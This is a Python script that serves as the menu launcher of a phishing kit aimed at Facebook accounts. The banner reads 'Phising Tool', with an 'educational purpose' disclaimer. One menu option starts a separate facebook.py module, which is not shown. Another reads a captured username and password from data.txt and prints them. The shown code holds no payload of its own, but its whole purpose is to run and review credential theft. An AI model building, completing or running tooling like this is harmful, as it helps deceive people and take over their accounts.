import subprocess
import time
import pyfiglet
import sys
from rich.console import Console, Group
from rich.panel import Panel
from rich.align import Align
from rich.text import Text
from rich.prompt import Prompt

console = Console()


#Animation 


def loading():
    console.clear()
    for i in range(3):
        console.print("[bold cyan]Loading Tool[/bold cyan]" + "." * i)
        time.sleep(2)
        console.clear()


# Banner


def home():
    console.clear()

    banner = pyfiglet.figlet_format("Phising Tool", font="big")
    banner_text = Text(banner, style="bold bright_cyan")

    tool_line = Text("|--(RT6 CEO Rakib)--|", style="bold bright_magenta")
    author = Text("Author : Rakib Hossen", style="bold bright_green")
    warning = Text("Only for educational purpose", style="bold yellow")

    content = Group(
        Align.center(banner_text),
        Align.center(tool_line),
        Align.center(author),
        Align.center(warning),
    )

    panel = Panel(
        content,
        border_style="bright_blue",
        padding=(1, 2),
        width=80
    )

    console.print(panel)



# Show Credentials 


def show_credentials():
    try:
        with open("data.txt", "r") as f:
            username = f.readline().strip()
            password = f.readline().strip()

        console.print("\n[bold green]Saved Credentials[/bold green]")
        console.print(f"[cyan]Username[/cyan] : {username}")
        console.print(f"[red]Password[/red] : {password}")

    except FileNotFoundError:
        console.print("[bold red]Error: data.txt file not found![/bold red]")



# Menu 


def menu():
    while True:
        console.print("\n[bold yellow]1)[/bold yellow] Facebook")
        console.print("[bold yellow]2)[/bold yellow] Show Saved Passwords and username")
        console.print("[bold yellow]3)[/bold yellow] Exit\n")

        choice = Prompt.ask("Choose", choices=["1", "2", "3"])

        if choice == "1":
            console.print("\n[bold green]Starting Facebook module...[/bold green]")
            try:
                subprocess.run(
                    [sys.executable, "facebook.py"],
                    check=False
                )
            except KeyboardInterrupt:
                console.print(
                    "\n[bold yellow]Process interrupted. Returning to menu...[/bold yellow]"
                )
                
        elif choice == "2":
            show_credentials()

        elif choice == "3":
            console.print("\n[bold red]Bye![/bold red]")
            break


# Run


if __name__ == "__main__":
    try:
        loading()
        home()
        menu()
    except KeyboardInterrupt:
        console.print("\n[bold red]Program closed by user[/bold red]")
